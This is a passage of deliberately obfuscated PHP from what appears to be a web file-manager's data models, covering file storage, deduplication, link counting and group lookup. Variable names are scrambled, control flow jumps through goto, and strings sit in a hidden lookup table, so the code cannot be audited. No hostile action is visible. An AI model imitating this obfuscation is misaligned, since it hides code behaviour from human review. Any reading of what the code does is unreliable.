$A¶¹…„§ƒ† =& $_SERVER[ÉóçÄÇ]; if (isset($BÀ¸¡Ò©æ²[$A¶¹…„§ƒ†[1712]])) { if ($BÀ¸¡Ò©æ²[$A¶¹…„§ƒ†[1712]]) { $BÀ¸¡Ò©æ²[$A¶¹…„§ƒ†[1713]] = array($A¶¹…„§ƒ†[953], intval($BÀ¸¡Ò©æ²[$A¶¹…„§ƒ†[1712]])); } unset($BÀ¸¡Ò©æ²[$A¶¹…„§ƒ†[1712]]); } if (isset($BÀ¸¡Ò©æ²[$A¶¹…„§ƒ†[1714]])) { if ($BÀ¸¡Ò©æ²[$A¶¹…„§ƒ†[1714]]) { $BÀ¸¡Ò©æ²[$A¶¹…„§ƒ†[1713]] = array($A¶¹…„§ƒ†[950], intval($BÀ¸¡Ò©æ²[$A¶¹…„§ƒ†[1714]])); } unset($BÀ¸¡Ò©æ²[$A¶¹…„§ƒ†[1714]]); } return $this->_listData($BÀ¸¡Ò©æ²); } private function _listData($eôĞ¡ƒæ´¤) { $FäË¦áŞ =& $_SERVER[ÉóçÄÇ]; $Eï‹óƒÒ¹¥ = $this->where($eôĞ¡ƒæ´¤)->_makeOrder()->selectPage(100); $this->_listAppendParent($Eï‹óƒÒ¹¥[$FäË¦áŞ[365]]); $this->_listAppendUser($Eï‹óƒÒ¹¥[$FäË¦áŞ[365]]); $this->_listAppendMeta($Eï‹óƒÒ¹¥[$FäË¦áŞ[365]]); return $Eï‹óƒÒ¹¥; } private function _makeOrder() { $bë¥Â†¹Í =& $_SERVER[ÉóçÄÇ]; $dğõ™ÖôÊ = array($bë¥Â†¹Í[1705], $bë¥Â†¹Í[1704], $bë¥Â†¹Í[192]); $dĞ ÕšŞµ¡ = Input::get($bë¥Â†¹Í[429], $bë¥Â†¹Í[7], $bë¥Â†¹Í[410], $dğõ™ÖôÊ); $FÌ´ÖÆ‰š = Input::get($bë¥Â†¹Í[430], $bë¥Â†¹Í[7], $bë¥Â†¹Í[1505], array($bë¥Â†¹Í[1715], $bë¥Â†¹Í[425])); $DËù‡ÒÖ¿ö = $dĞ ÕšŞµ¡ . $bë¥Â†¹Í[50] . $FÌ´ÖÆ‰š; return $this->order($DËù‡ÒÖ¿ö); } private function _listAppendParent(&$b˜¹¼ÛË¿¿) { goto f·õë‚šñ©; f·õë‚šñ©: $d÷¬æ„§ã =& $_SERVER[ÉóçÄÇ]; $Bô“Œ¾‡ãÅ = array_unique(array_to_keyvalue($b˜¹¼ÛË¿¿, $d÷¬æ„§ã[33], $d÷¬æ„§ã[1702])); $Bô“Œ¾‡ãÅ = array_remove_value($Bô“Œ¾‡ãÅ, $d÷¬æ„§ã[491]); goto eÕ¦ÅÒŠõ’; eÕ¦ÅÒŠõ’: if (!$Bô“Œ¾‡ãÅ) { return; } $b›º³“ÀÅ® = $this->where(array($d÷¬æ„§ã[1703] => array($d÷¬æ„§ã[7], $Bô“Œ¾‡ãÅ)))->select(); $b›º³“ÀÅ® = array_to_keyvalue($b›º³“ÀÅ®, $d÷¬æ„§ã[1713]); goto AßøîñëŞÃ; AßøîñëŞÃ: foreach ($b˜¹¼ÛË¿¿ as &$f»åù¥ŒğÔ) { if (isset($b›º³“ÀÅ®[$f»åù¥ŒğÔ[$d÷¬æ„§ã[1702]]])) { $f»åù¥ŒğÔ[$d÷¬æ„§ã[1716]] = $b›º³“ÀÅ®[$f»åù¥ŒğÔ[$d÷¬æ„§ã[1702]]]; } } unset($f»åù¥ŒğÔ); goto eÊÖšÁÆŸ; eÊÖšÁÆŸ: } private function _listAppendUser(&$c¾øè“¸‹Ü) { goto b™¯ß¤ÉÂ; b©íŒ©Ã: if (count($cé¨Ûµğ˜) == 0) { return; } foreach ($c¾øè“¸‹Ü as $A¯¿ƒ‹ƒ) { if (isset($A¯¿ƒ‹ƒ[$eíèä­È[1716]])) { $cé¨Ûµğ˜[] = $A¯¿ƒ‹ƒ[$eíèä­È[1716]][$eíèä­È[1511]]; } } $bø¤•†øğŒ = Model($eíèä­È[501])->userListInfo($cé¨Ûµğ˜); goto b¦‡…™Ë; b¦‡…™Ë: foreach ($c¾øè“¸‹Ü as &$A¯¿ƒ‹ƒ) { $A¯¿ƒ‹ƒ[$eíèä­È[557]] = $bø¤•†øğŒ[$A¯¿ƒ‹ƒ[$eíèä­È[1511]]]; if (isset($A¯¿ƒ‹ƒ[$eíèä­È[1716]])) { $A¯¿ƒ‹ƒ[$eíèä­È[1716]][$eíèä­È[557]] = $bø¤•†øğŒ[$A¯¿ƒ‹ƒ[$eíèä­È[1716]][$eíèä­È[1511]]]; } } unset($A¯¿ƒ‹ƒ); goto c…×¶ìÚ‡§; b™¯ß¤ÉÂ: $eíèä­È =& $_SERVER[ÉóçÄÇ]; $cé¨Ûµğ˜ = array_unique(array_to_keyvalue($c¾øè“¸‹Ü, $eíèä­È[33], $eíèä­È[1511])); $cé¨Ûµğ˜ = array_remove_value($cé¨Ûµğ˜, $eíèä­È[491]); goto b©íŒ©Ã; c…×¶ìÚ‡§: } private function _listAppendMeta(&$EñŸ«òöØ) { goto AÇ¤Ô‰¼õ; E¾ ·‚ö¸Ã: if (!$bÊĞìÑó÷) { return; } foreach ($EñŸ«òöØ as $Cƒòñî¤) { if (isset($Cƒòñî¤[$BáÚ´ï’[1716]])) { $bÊĞìÑó÷[] = $Cƒòñî¤[$BáÚ´ï’[1716]][$BáÚ´ï’[1713]]; } } $EÕ…Ì»çê = $this->metaList($bÊĞìÑó÷); goto f‰¶Šã«ŒŒ; f‰¶Šã«ŒŒ: if (!$EÕ…Ì»çê) { return !1; } foreach ($EñŸ«òöØ as &$Cƒòñî¤) { $Cƒòñî¤[$BáÚ´ï’[439]] = $EÕ…Ì»çê[$Cƒòñî¤[$BáÚ´ï’[1713]]]; if (isset($Cƒòñî¤[$BáÚ´ï’[1716]])) { $Cƒòñî¤[$BáÚ´ï’[1716]][$BáÚ´ï’[439]] = $EÕ…Ì»çê[$Cƒòñî¤[$BáÚ´ï’[1716]][$BáÚ´ï’[1713]]]; } } unset($Cƒòñî¤); goto F÷°¢å·¸½; AÇ¤Ô‰¼õ: $BáÚ´ï’ =& $_SERVER[ÉóçÄÇ]; $bÊĞìÑó÷ = array_unique(array_to_keyvalue($EñŸ«òöØ, $BáÚ´ï’[33], $BáÚ´ï’[1713])); $bÊĞìÑó÷ = array_remove_value($bÊĞìÑó÷, $BáÚ´ï’[491]); goto E¾ ·‚ö¸Ã; F÷°¢å·¸½: } private function metaList($Bò¤”°ÉÏÉ) { goto dåô†Øä‚”; e§‹‰Ç…·ç: return $Fõåï°ºÊ— ? $Fõåï°ºÊ— : array(); goto E£¤Ÿ–¸”ç; dÅİÆÚÉ­²: $Fõåï°ºÊ— = Model($fİá°„ö¤à[1717])->where($e§£¸Ùˆ)->select(); $Fõåï°ºÊ— = array_to_keyvalue_group($Fõåï°ºÊ—, $fİá°„ö¤à[1713]); foreach ($Fõåï°ºÊ— as $aïÀª·•æˆ => $Fß–ïÈŠÚ“) { $E¹Éšˆ»ìº = array(); foreach ($Fß–ïÈŠÚ“ as $cóØ» ÍÑÇ) { $E¹Éšˆ»ìº[$cóØ» ÍÑÇ[$fİá°„ö¤à[92]]] = $cóØ» ÍÑÇ[$fİá°„ö¤à[370]]; } $Fõåï°ºÊ—[$aïÀª·•æˆ] = $E¹Éšˆ»ìº; } goto e§‹‰Ç…·ç; dåô†Øä‚”: $fİá°„ö¤à =& $_SERVER[ÉóçÄÇ]; if (!$Bò¤”°ÉÏÉ) { return array(); } $e§£¸Ùˆ = array($fİá°„ö¤à[1713] => array($fİá°„ö¤à[7], $Bò¤”°ÉÏÉ)); goto dÅİÆÚÉ­²; E£¤Ÿ–¸”ç: } } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\146\x69\x6c\145"; protected $tableMeta = array("\164\141\x62\154\145\x4e\x61\x6d\x65" => "\151\x6f\137\x66\151\154\x65\137\x6d\x65\164\x61", "\x6d\145\x74\141\106\151\145\154\144" => "\x66\x69\154\145\111\104"); public function fileInfo($f¬Éáç‰ê) { $cÚ™ÔĞ«Ÿ¦ =& $_SERVER[ÉóçÄÇ]; static $eğã÷¡í‡‡ = array(); if (!isset($eğã÷¡í‡‡[$f¬Éáç‰ê])) { $B›¢‡Ôé‹ó = $cÚ™ÔĞ«Ÿ¦[1718]; $C†‚ÂÑ–Ñ = Model($cÚ™ÔĞ«Ÿ¦[444])->field($B›¢‡Ôé‹ó)->where(array($cÚ™ÔĞ«Ÿ¦[442] => $f¬Éáç‰ê))->find(); $eğã÷¡í‡‡[$f¬Éáç‰ê] = $C†‚ÂÑ–Ñ; } return $eğã÷¡í‡‡[$f¬Éáç‰ê]; } public function addFileByContent($e„ÕÂÙœÑ = '', $Céç±“ôæÚ = '') { goto CğßÙ›»Ü; CğßÙ›»Ü: $CÓÒ°İá¤à =& $_SERVER[ÉóçÄÇ]; $fôôÄÓ„Í = TEMP_PATH . $CÓÒ°İá¤à[1719]; if (!is_dir($fôôÄÓ„Í)) { mk_dir($fôôÄÓ„Í); } goto c–¶› ¤ù¼; c–¶› ¤ù¼: $Aöµ–„•à = $fôôÄÓ„Í . $CÓÒ°İá¤à[1720] . rand_string(16); file_put_contents($Aöµ–„•à, $e„ÕÂÙœÑ); $C°ó¥‘¹‚¦ = $this->addFile($Aöµ–„•à, $Céç±“ôæÚ, !0); goto B™ÆÙöšõè; B™ÆÙöšõè: if (file_exists($Aöµ–„•à)) { @unlink($Aöµ–„•à); } return $C°ó¥‘¹‚¦; goto AÂ™¨ê¶¨÷; AÂ™¨ê¶¨÷: } public function createFileName($DØˆæ¹ŠÚ, $aÛ¢’»ß = false) { goto AÈ„”…µ; f„Ñ™°‚¢…: $Dƒßµ¾¹¤ = $D¡¥Éî×Ş->pathFather($DÁĞï£­‡); static $AçŠÄÜåÔö = false; $eÎ‹ˆøÂ…„ = $EÆİƒùáó[1721] . md5($Dƒßµ¾¹¤); goto CÈñë¥ğ´; CÈñë¥ğ´: if (!$AçŠÄÜåÔö && !Cache::get($eÎ‹ˆøÂ…„)) { $AçŠÄÜåÔö = !0; $b±Ã¬ÔÒÕğ = IO::mkdir($Dƒßµ¾¹¤); if (!IO::exist($b±Ã¬ÔÒÕğ . $EÆİƒùáó[1722])) { IO::mkfile($b±Ã¬ÔÒÕğ . $EÆİƒùáó[1722]); } Cache::set($eÎ‹ˆøÂ…„, 1, 3600 * 2); } return $DÁĞï£­‡; goto B…İ§Ö¤éÈ; AÈ„”…µ: $EÆİƒùáó =& $_SERVER[ÉóçÄÇ]; $D¡¥Éî×Ş = IO::init($EÆİƒùáó[8]); $DÁĞï£­‡ = $this->makeFilePath($DØˆæ¹ŠÚ, $D¡¥Éî×Ş, $aÛ¢’»ß); goto f„Ñ™°‚¢…; B…İ§Ö¤éÈ: } public function makeFilePath($BòÅø™®Â, $DÚ“ŒË¦ñ­, $BĞ¶î´…°” = false) { goto C‘»²‹»º; c–ÈõÁ»¦Œ: if (!$BòÅø™®Â) { $a¥ğæ©„´¸ = $a‹‚ãÊ¥¬Ñ[1725]; } switch ($a¥ğæ©„´¸) { case $a‹‚ãÊ¥¬Ñ[1726]: $fÄå’¾²¼ = $fÄå’¾²¼ . $a‹‚ãÊ¥¬Ñ[94] . $DÚ“ŒË¦ñ­->ext($BòÅø™®Â); if ($Eåö…Šø == $a‹‚ãÊ¥¬Ñ[1664]) { $fÄå’¾²¼ .= $a‹‚ãÊ¥¬Ñ[1410]; } break; case $a‹‚ãÊ¥¬Ñ[1727]: goto C¾ÜóˆÊëÁ; AğÔëÚ—“: $eêøÃ´ˆ¦ = $a‹‚ãÊ¥¬Ñ[1104] . $C–¶¯¼¹[$a‹‚ãÊ¥¬Ñ[388]] . $a‹‚ãÊ¥¬Ñ[396] . date($a‹‚ãÊ¥¬Ñ[1729]) . $Aº®»Š®¶ . $a‹‚ãÊ¥¬Ñ[8]; if ($Eåö…Šø == $a‹‚ãÊ¥¬Ñ[1664]) { $BòÅø™®Â .= $a‹‚ãÊ¥¬Ñ[1410]; } $cÀƒ‘àùÂ = $a‹‚ãÊ¥¬Ñ[1730] . $eêøÃ´ˆ¦ . $BòÅø™®Â; goto E«˜­†Öã; a›£ÏâÈÍ: if (IO::isTypeObject($fÄå’¾²¼) && !IO::isUploadServer($fÄå’¾²¼)) { $A¡†æ‹¡„Ó = IO::setContent($fÄå’¾²¼, $a‹‚ãÊ¥¬Ñ[33]); if (!$A¡†æ‹¡„Ó) { show_json($a‹‚ãÊ¥¬Ñ[1731], !1); } } CacheLock::unlock($cÀƒ‘àùÂ); break; goto c¯« ÌÀ¿‡; E«˜­†Öã: CacheLock::lock($cÀƒ‘àùÂ); $fÄå’¾²¼ = $eêøÃ´ˆ¦ . $BòÅø™®Â; if (IO::exist($eêøÃ´ˆ¦ . $BòÅø™®Â)) { $AÅÁ«…Ë½Ğ = substr($BòÅø™®Â, 0, strlen($BòÅø™®Â) - strlen($Eåö…Šø)); $fÄå’¾²¼ = $eêøÃ´ˆ¦ . $AÅÁ«…Ë½Ğ . substr($BĞ¶î´…°”, 0, 5) . $a‹‚ãÊ¥¬Ñ[94] . $Eåö…Šø; } goto a›£ÏâÈÍ; C¾ÜóˆÊëÁ: $A¬ÃÔ‡´¡ë = Model($a‹‚ãÊ¥¬Ñ[1106])->get($a‹‚ãÊ¥¬Ñ[1406]); $Aº®»Š®¶ = substr(md5($a‹‚ãÊ¥¬Ñ[1728] . $A¬ÃÔ‡´¡ë . date($a‹‚ãÊ¥¬Ñ[709])), 0, 8); $C–¶¯¼¹ = KodIO::defaultDriver(); goto AğÔëÚ—“; c¯« ÌÀ¿‡: case $a‹‚ãÊ¥¬Ñ[1725]: break; default: break; } return $fÄå’¾²¼; goto Fù±–ô…‰‚; C‘»²‹»º: $a‹‚ãÊ¥¬Ñ =& $_SERVER[ÉóçÄÇ]; $a¥ğæ©„´¸ = Model($a‹‚ãÊ¥¬Ñ[1106])->get($a‹‚ãÊ¥¬Ñ[1723]); $eêøÃ´ˆ¦ = KodIO::defaultIO() . date($a‹‚ãÊ¥¬Ñ[1724]); goto c”‹¸ÀÅëß; c”‹¸ÀÅëß: $fÄå’¾²¼ = $eêøÃ´ˆ¦ . rand_string(5) . short_id(100); $BòÅø™®Â = str_replace($a‹‚ãÊ¥¬Ñ[8], $a‹‚ãÊ¥¬Ñ[70], KodIO::clear($BòÅø™®Â)); $Eåö…Šø = $DÚ“ŒË¦ñ­->ext($BòÅø™®Â); goto c–ÈõÁ»¦Œ; Fù±–ô…‰‚: } public function addFileByRemote($A‚Ç¯¬Å¨Ø, $BŠ…à”¼ÔĞ, $FæÊ× §Ûµ = array()) { goto fÁŠÛø‡çá; fÁŠÛø‡çá: $c‡ÇÖÛ°  =& $_SERVER[ÉóçÄÇ]; if (!IO::exist($A‚Ç¯¬Å¨Ø)) { return !1; } $fîÅ‹ì»…æ = $FæÊ× §Ûµ[$c‡ÇÖÛ° [169]] ? $FæÊ× §Ûµ[$c‡ÇÖÛ° [169]] : $c‡ÇÖÛ° [33]; goto Cî®îÂŞÉç; B´ß°–¿Ğ: if ($CÉºîÂÉî = $this->addFileCheckExist($AÇ”¸ÖÙ×[$c‡ÇÖÛ° [170]], $AÇ”¸ÖÙ×[$c‡ÇÖÛ° [169]], $AÇ”¸ÖÙ×[$c‡ÇÖÛ° [77]])) { return $CÉºîÂÉî; } return $this->addFileData($AÇ”¸ÖÙ×); goto aÒÎÂğâÕ²; Cî®îÂŞÉç: $f¨“¤³°Í = IO::hashMd5($A‚Ç¯¬Å¨Ø, $fîÅ‹ì»…æ); $Cí´Û¿ï˜ = KodIO::defaultDriver(); $AÇ”¸ÖÙ× = array($c‡ÇÖÛ° [543] => IO::size($A‚Ç¯¬Å¨Ø), $c‡ÇÖÛ° [1732] => 1, $c‡ÇÖÛ° [407] => $BŠ…à”¼ÔĞ, $c‡ÇÖÛ° [761] => $Cí´Û¿ï˜[$c‡ÇÖÛ° [388]], $c‡ÇÖÛ° [408] => $A‚Ç¯¬Å¨Ø, $c‡ÇÖÛ° [1733] => $FæÊ× §Ûµ[$c‡ÇÖÛ° [170]] ? $FæÊ× §Ûµ[$c‡ÇÖÛ° [170]] : IO::hashSimple($A‚Ç¯¬Å¨Ø), $c‡ÇÖÛ° [1734] => $f¨“¤³°Í ? $f¨“¤³°Í : $fîÅ‹ì»…æ); goto B´ß°–¿Ğ; aÒÎÂğâÕ²: } private function addFileData($bˆĞà¨‹ô) { $dèçÛŠÖ«É =& $_SERVER[ÉóçÄÇ]; if (!$bˆĞà¨‹ô) { return !1; } $bˆĞà¨‹ô[$dèçÛŠÖ«É[77]] = intval($bˆĞà¨‹ô[$dèçÛŠÖ«É[77]]); if (!$bˆĞà¨‹ô[$dèçÛŠÖ«É[77]] && strlen($bˆĞà¨‹ô[$dèçÛŠÖ«É[170]]) > 32) { $bˆĞà¨‹ô[$dèçÛŠÖ«É[77]] = intval(substr($bˆĞà¨‹ô[$dèçÛŠÖ«É[170]], 32)); } $Fë¼ÜÃäĞ = $this->add($bˆĞà¨‹ô); return $this->find($Fë¼ÜÃäĞ); } public function addFile($bÆÈŒ¯ğÓ÷, $F§Øá¤Õ, $D©¶•Óº ƒ = false) { goto dŞçÒ…Çµ; dŞçÒ…Çµ: $cŠ¨ßº©¥† = IO::hashSimple($bÆÈŒ¯ğÓ÷); $C“‹çµš×¸ = IO::hashMd5($bÆÈŒ¯ğÓ÷); $BÉ¿ÀÔ’ = IO::size($bÆÈŒ¯ğÓ÷); goto e‘Œ×»î½¢; e‘Œ×»î½¢: $aÚŠËÃºÔ˜ = $_SERVER[ÉóçÄÇ][1735] . $C“‹çµš×¸; CacheLock::lock($aÚŠËÃºÔ˜); if ($d²”¹¼Ú = $this->addFileCheckExist($cŠ¨ßº©¥†, $C“‹çµš×¸, $BÉ¿ÀÔ’)) { CacheLock::unlock($aÚŠËÃºÔ˜); return $d²”¹¼Ú; } goto A„Â¸ÓĞƒ; cœî¼…Ë¾: return $b¤¦‰øÌÛÏ; goto bÈê‰Ë¡òÛ; A„Â¸ÓĞƒ: $Aè­º‚ Õ = $this->addFileMake($bÆÈŒ¯ğÓ÷, $BÉ¿ÀÔ’, $cŠ¨ßº©¥†, $C“‹çµš×¸, $F§Øá¤Õ, $D©¶•Óº ƒ); $b¤¦‰øÌÛÏ = $this->addFileData($Aè­º‚ Õ); CacheLock::unlock($aÚŠËÃºÔ˜); goto cœî¼…Ë¾; bÈê‰Ë¡òÛ: } public function addFileMake($eì½Ñ£–‡â, $eå¿¥ÜÑ‘ó, $fÅÜ¤¤÷·ñ, $aÂ¡„ãÒ“, $F›ôìÄ±óò, $e¼‡¡¿ó“È) { goto EÔÛÆĞ¿; fö¬ÀççÃ‹: $bçÓì¨ç™ = KodIO::defaultDriver(); $b°„Å“„™Ñ = array($A¤à§ª”ÏÖ[543] => $eå¿¥ÜÑ‘ó, $A¤à§ª”ÏÖ[1732] => 1, $A¤à§ª”ÏÖ[407] => $F›ôìÄ±óò, $A¤à§ª”ÏÖ[761] => $bçÓì¨ç™[$A¤à§ª”ÏÖ[388]], $A¤à§ª”ÏÖ[408] => $eŸâ©Ñ´Âğ, $A¤à§ª”ÏÖ[1733] => $fÅÜ¤¤÷·ñ, $A¤à§ª”ÏÖ[1734] => $aÂ¡„ãÒ“); return $b°„Å“„™Ñ; goto cÄùŒíœçù; EÔÛÆĞ¿: $A¤à§ª”ÏÖ =& $_SERVER[ÉóçÄÇ]; $eŸâ©Ñ´Âğ = $this->createFileName($F›ôìÄ±óò, $aÂ¡„ãÒ“); $Bù¹¶îÏ’ã = get_path_father($eŸâ©Ñ´Âğ); goto cğàŠ°¡­¹; cğàŠ°¡­¹: $AâîãçØ—… = get_path_this($eŸâ©Ñ´Âğ); if ($e¼‡¡¿ó“È) { $c‰ÒˆêéŞ = IO::move($eì½Ñ£–‡â, $Bù¹¶îÏ’ã, !1, $AâîãçØ—…); } else { $c‰ÒˆêéŞ = IO::copy($eì½Ñ£–‡â, $Bù¹¶îÏ’ã, !1, $AâîãçØ—…); } if (!$c‰ÒˆêéŞ) { return !1; } goto fö¬ÀççÃ‹; cÄùŒíœçù: } public function addFileCheckExist($b‚áÕ–ùÉ, $A ß”ã˜Å, $AèÖŸá¸£º) { $eµäŞ£à‰ =& $_SERVER[ÉóçÄÇ]; $cïÌİ‰£á‰ = $this->findByHash($b‚áÕ–ùÉ, $A ß”ã˜Å); if (!$cïÌİ‰£á‰) { return !1; } $bèŸŠğ‡  = array($eµäŞ£à‰[1732] => intval($cïÌİ‰£á‰[$eµäŞ£à‰[1736]]) + 1, $eµäŞ£à‰[543] => $AèÖŸá¸£º); $this->where(array($eµäŞ£à‰[442] => $cïÌİ‰£á‰[$eµäŞ£à‰[441]]))->save($bèŸŠğ‡ ); return $cïÌİ‰£á‰; } public function remove($b¥§èî™) { $this->linkCountChange($b¥§èî™, !1); $this->clearEmpty(); return !0; } public function linkAdd($F’”ÈàŒ£) { $this->linkCountChange($F’”ÈàŒ£, !0); } public function linkCountChange($FÒ¹ƒ×ª…, $d Ò¹Çİ°ê) { goto C’´˜ŒôÎ¶; a™Ôˆ…è±‹: foreach ($Aªù®ê³µ as $cÙˆÇ°“…¯ => $Bö®ìä¦˜¯) { $B‘œ­ÉÌî§ = $Bö®ìä¦˜¯ . $aíÊÈÌ —Õ[33]; if (!$FˆÖÔİÄ›Á[$B‘œ­ÉÌî§]) { $FˆÖÔİÄ›Á[$B‘œ­ÉÌî§] = array(); } $FˆÖÔİÄ›Á[$B‘œ­ÉÌî§][] = $cÙˆÇ°“…¯; } foreach ($FˆÖÔİÄ›Á as $Bö®ìä¦˜¯ => $EÄÛ•¢†·À) { if (!$EÄÛ•¢†·À) { continue; } $Bö®ìä¦˜¯ = $d Ò¹Çİ°ê ? $Bö®ìä¦˜¯ : -intval($Bö®ìä¦˜¯); $EÍÜ‹ôºÁ‘ = array($aíÊÈÌ —Õ[441] => array($aíÊÈÌ —Õ[7], $EÄÛ•¢†·À)); if ($Bö®ìä¦˜¯ < 0) { $EÍÜ‹ôºÁ‘[$aíÊÈÌ —Õ[1736]] = array($aíÊÈÌ —Õ[954], abs($Bö®ìä¦˜¯)); } $this->where($EÍÜ‹ôºÁ‘)->setAdd($aíÊÈÌ —Õ[1736], $Bö®ìä¦˜¯); } goto Cì‡ğ£éŸø; C’´˜ŒôÎ¶: $aíÊÈÌ —Õ =& $_SERVER[ÉóçÄÇ]; if (!$FÒ¹ƒ×ª…) { return; } if (!is_array($FÒ¹ƒ×ª…)) { $FÒ¹ƒ×ª… = array($FÒ¹ƒ×ª…); } goto cù¢‡ˆ¸¶…; cù¢‡ˆ¸¶…: $Aªù®ê³µ = array(); foreach ($FÒ¹ƒ×ª… as $cÙˆÇ°“…¯) { $B‘œ­ÉÌî§ = $cÙˆÇ°“…¯ . $aíÊÈÌ —Õ[33]; if (!$Aªù®ê³µ[$B‘œ­ÉÌî§]) { $Aªù®ê³µ[$B‘œ­ÉÌî§] = 0; } $Aªù®ê³µ[$B‘œ­ÉÌî§]++; } $FˆÖÔİÄ›Á = array(); goto a™Ôˆ…è±‹; Cì‡ğ£éŸø: } public function findByHash($fÎ›³µøƒ, $DÖŠ¿ÔŒÙ® = false) { $bÍ°×İ”Ç =& $_SERVER[ÉóçÄÇ]; if (!$fÎ›³µøƒ && !$DÖŠ¿ÔŒÙ®) { return !1; } $bç†ĞÏŒ³ = array($bÍ°×İ”Ç[1733] => $fÎ›³µøƒ); if ($DÖŠ¿ÔŒÙ®) { $bç†ĞÏŒ³ = array($bÍ°×İ”Ç[1734] => $DÖŠ¿ÔŒÙ®); } return $this->order($bÍ°×İ”Ç[1737])->where($bç†ĞÏŒ³)->find(); } public function clearEmpty($b§êÅäÌí = 0) { goto AåÓ²Ùã›Ô; eÅ•İ¼´Æ: foreach ($BÓ³’öëÛ± as $b•¶ææÁŠ•) { $c™‚‚¸£ ç->update(1); $this->resetFile($b•¶ææÁŠ•); } $c™‚‚¸£ ç->end(); goto BØğĞÖ®ö÷; AåÓ²Ùã›Ô: $dÁ”¡¼Ò•Õ =& $_SERVER[ÉóçÄÇ]; $e¨’¦˜¬¥¿ = time() - 3600 * 24 * $b§êÅäÌí; $D¼Œ÷§³Ÿ = $dÁ”¡¼Ò•Õ[1738] . $e¨’¦˜¬¥¿; goto dñ‰ù†í–†; dñ‰ù†í–†: $BÓ³’öëÛ± = $this->where($D¼Œ÷§³Ÿ)->select(); if (!$BÓ³’öëÛ±) { return; } $c™‚‚¸£ ç = new Task($dÁ”¡¼Ò•Õ[1739], $dÁ”¡¼Ò•Õ[33], count($BÓ³’öëÛ±)); goto eÅ•İ¼´Æ; BØğĞÖ®ö÷: } public function resetFile($EèÒà–ê³) { goto c×¹í™ç¯ç; c×¹í™ç¯ç: $A¦š¤ï½±î =& $_SERVER[ÉóçÄÇ]; $D Å–ºßÚí = array($A¦š¤ï½±î[442] => $EèÒà–ê³[$A¦š¤ï½±î[441]]); $c…Åİ‡Á„Ë = Model($A¦š¤ï½±î[1186])->where($D Å–ºßÚí)->count(); goto FÈêªâ¼ªØ; Fììèšİ¶®: if ($EèÒà–ê³[$A¦š¤ï½±î[1736]] != $F˜ÖØªå›ò) { $this->where($D Å–ºßÚí)->save(array($A¦š¤ï½±î[1732] => $F˜ÖØªå›ò)); } goto d¬§ãÙ¯»; FÈêªâ¼ªØ: $D ‡‰Ù¥À = Model($A¦š¤ï½±î[1740])->where($D Å–ºßÚí)->count(); $F˜ÖØªå›ò = intval($c…Åİ‡Á„Ë) + intval($D ‡‰Ù¥À); if ($F˜ÖØªå›ò == 0) { IO::remove($EèÒà–ê³[$A¦š¤ï½±î[75]]); $this->where($D Å–ºßÚí)->delete(); $this->metaSet($EèÒà–ê³[$A¦š¤ï½±î[441]], null, null); return; } goto Fììèšİ¶®; d¬§ãÙ¯»: } public function storageInfo($A¹Ò†‰¾„œ = false) { goto fÛé²ŒÇìØ; bŒ©êÀƒ³: $Fã†ã”Ù = 1; $B ÑÓÜ½Ó = 0; $DË­—ÃÏä² = 5000; goto FÙ†¨†ƒŒ; FÙ†¨†ƒŒ: for ($C¸ÛÃ§Ø’— = 0; $C¸ÛÃ§Ø’— < $fğìç„ÓÔ²; $C¸ÛÃ§Ø’— = $C¸ÛÃ§Ø’— + $DË­—ÃÏä²) { $E”…ª¥ˆ¹¶ = $this->limit($C¸ÛÃ§Ø’—, $C¸ÛÃ§Ø’— + $DË­—ÃÏä²)->select(); foreach ($E”…ª¥ˆ¹¶ as $fù¦´ç¯«) { $Fã†ã”Ù += $fù¦´ç¯«[$dÊùöŒ—õÈ[77]] * $fù¦´ç¯«[$dÊùöŒ—õÈ[1736]]; $C—ïµ¿¯ += $fù¦´ç¯«[$dÊùöŒ—õÈ[77]] * ($fù¦´ç¯«[$dÊùöŒ—õÈ[1736]] - 1); $B ÑÓÜ½Ó += $fù¦´ç¯«[$dÊùöŒ—õÈ[1736]]; } } $EÈÀĞµÔÇå = array($dÊùöŒ—õÈ[1741] => $Fã†ã”Ù, $dÊùöŒ—õÈ[1742] => $C—ïµ¿¯, $dÊùöŒ—õÈ[1743] => $C—ïµ¿¯ / $Fã†ã”Ù, $dÊùöŒ—õÈ[81] => $fğìç„ÓÔ², $dÊùöŒ—õÈ[1744] => $B ÑÓÜ½Ó); return $EÈÀĞµÔÇå; goto BØŸâï²“õ; fÛé²ŒÇìØ: $dÊùöŒ—õÈ =& $_SERVER[ÉóçÄÇ]; $fğìç„ÓÔ² = $this->count() + 0.0; $C—ïµ¿¯ = 0; goto bŒ©êÀƒ³; BØŸâï²“õ: } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\x75\x70"; protected $tableMeta = array("\x74\141\142\x6c\x65\x4e\x61\155\x65" => "\x67\162\157\x75\x70\x5f\x6d\x65\x74\x61", "\x6d\x65\164\x61\x46\151\x65\154\144" => "\147\x72\x6f\x75\160\111\x44"); protected function cacheFunctionAlias($CçÅëÚš¿) { $cŞ¿õ‹ŒÄ =& $_SERVER[ÉóçÄÇ]; return array($cŞ¿õ‹ŒÄ[1745] => array($CçÅëÚš¿[0], $cŞ¿õ‹ŒÄ[1746]), $cŞ¿õ‹ŒÄ[1747] => array($CçÅëÚš¿[0], $cŞ¿õ‹ŒÄ[1746])); } protected function getInfo($bÄøË‡£½ˆ) { $D¶Ş²ˆ¶‰… = $this->getInfoSimple($bÄøË‡£½ˆ); if (!$D¶Ş²ˆ¶‰…) { return !1; } return $this->_listDataApplyItem($D¶Ş²ˆ¶‰…); } protected function getInfoSimple($cã—ç•¶Èï, $BÈ»·¸·³› = false) { $EŒÎÍ„˜Ë =& $_SERVER[ÉóçÄÇ]; if ($BÈ»·¸·³›) { $C±ª¢ª„øÚ = array($EŒÎÍ„˜Ë[1674] => intval($cã—ç•¶Èï)); $Eœˆ³„à‡ = $this->where($C±ª¢ª„øÚ)->find(); return is_array($Eœˆ³„à‡) ? $Eœˆ³„à‡ : array(); } return $this->cacheFunctionGet($EŒÎÍ„˜Ë[1748], $cã—ç•¶Èï); } protected function groupAdd($A‹°¿ÁìÆ¨) { goto B”Âæ™¹¯; B”Âæ™¹¯: $aá™±·‰Ê =& $_SERVER[ÉóçÄÇ]; if (!$A‹°¿ÁìÆ¨[$aá™±·‰Ê[472]] && isset($A‹°¿ÁìÆ¨[$aá™±·‰Ê[1674]]) && $A‹°¿ÁìÆ¨[$aá™±·‰Ê[1674]] == 1) { if ($B¹„¶È—Îè = $this->getInfoSimple($A‹°¿ÁìÆ¨[$aá™±·‰Ê[1674]], !0)) { return $A‹°¿ÁìÆ¨[$aá™±·‰Ê[1674]]; } } else { $B¹„¶È—Îè 